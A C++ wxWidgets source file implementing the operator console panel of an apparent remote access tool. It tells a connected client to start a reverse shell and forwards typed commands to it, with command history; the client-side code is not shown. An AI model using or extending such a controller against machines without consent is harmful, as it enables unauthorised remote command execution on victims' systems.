#include "panel_reverse_shell.hpp"
#include "server.hpp"

extern Servidor* p_Servidor;
extern std::mutex vector_mutex;

//Reverse Shell
panelReverseShell::panelReverseShell(wxWindow* pParent) :
    wxPanel(pParent, EnumIDS::ID_Panel_Reverse_Shell) {
    wxWindow* wxTree = (MyTreeCtrl*)this->GetParent();
    if (wxTree) {
        wxPanel* panel_cliente = (wxPanel*)wxTree->GetParent();
        if (panel_cliente) {
            FrameCliente* frame_cliente = (FrameCliente*)panel_cliente->GetParent();
            if (frame_cliente) {
                this->sckCliente = frame_cliente->sckCliente;
            }
        }
    }
    this->txtConsole = new wxTextCtrl(this, EnumIDS::ID_Panel_Reverse_Shell_TxtConsole, "Reverse Shell v0.1\n", wxDefaultPosition, wxSize(FRAME_CLIENT_SIZE_WIDTH * 3, FRAME_CLIENT_SIZE_WIDTH * 3), wxTE_MULTILINE | wxTE_RICH);
    this->txtConsole->SetForegroundColour(*wxWHITE);
    this->txtConsole->SetBackgroundColour(*wxBLACK);

    wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);
    sizer->Add(this->txtConsole, 1, wxEXPAND | wxALL, 2);
    this->SetSizer(sizer);

    Bind(wxEVT_CHAR_HOOK, &panelReverseShell::OnHook, this);

    //Enviar comando al cliente para que ejecute la shell
    p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, 1, 0, false, EnumComandos::Reverse_Shell_Start);

}

void panelReverseShell::OnHook(wxKeyEvent& event) {
    //long last_position = this->txtConsole->GetLastPosition();
    unsigned long int current_pos = this->txtConsole->GetInsertionPoint();
    int iCode = event.GetKeyCode();
    if (iCode == WXK_LEFT || iCode == WXK_BACK) {
        //Si retrocedio hasta el ultimo regresarlo
        if (current_pos <= this->p_uliUltimo) {
            this->txtConsole->SetInsertionPoint(this->p_uliUltimo);
        }
        else {
            event.Skip();
        }
    }
    else if (iCode == WXK_UP) {
        //Historial de comandos?
        if (this->vc_History.size() > 0) {
            if (this->iHistorialPos > 0) {
                this->iHistorialPos--;
            }
            this->txtConsole->Remove(this->p_uliUltimo, this->txtConsole->GetLastPosition());
            wxString strTmp = this->vc_History[this->iHistorialPos];
            this->txtConsole->AppendText(strTmp);
            //std::cout << "HISTORIAL: [" << this->iHistorialPos << "] " << strTmp << std::endl;
        }
    }
    else if (iCode == WXK_DOWN) {
        if (this->vc_History.size() > 0) {
            if (this->iHistorialPos + 1 < this->vc_History.size()) {
                this->iHistorialPos++;
            }
            this->txtConsole->Remove(this->p_uliUltimo, this->txtConsole->GetLastPosition());
            wxString strTmp = this->vc_History[this->iHistorialPos];
            this->txtConsole->AppendText(strTmp);
            //std::cout << "HISTORIAL: [" << this->iHistorialPos << "] " << strTmp << std::endl;

        }

    }
    else if (iCode == WXK_RETURN) {
        wxString strCmdLine = this->txtConsole->GetRange(this->p_uliUltimo, this->txtConsole->GetLastPosition());
        this->vc_History.push_back(strCmdLine);

        wxString str1 = strCmdLine;
        str1.append(1, '\r');
        str1.append(1, '\n');

        p_Servidor->cChunkSend(this->sckCliente, str1.c_str(), str1.size(), 0, false, EnumComandos::Reverse_Shell_Command);

        this->p_uliUltimo = this->txtConsole->GetLastPosition() + 1;
        event.Skip();
    }
    else {
        if (this->txtConsole->GetInsertionPoint() < this->txtConsole->GetLastPosition()) {
            this->txtConsole->SetInsertionPointEnd();
        }
        event.Skip();
    }
}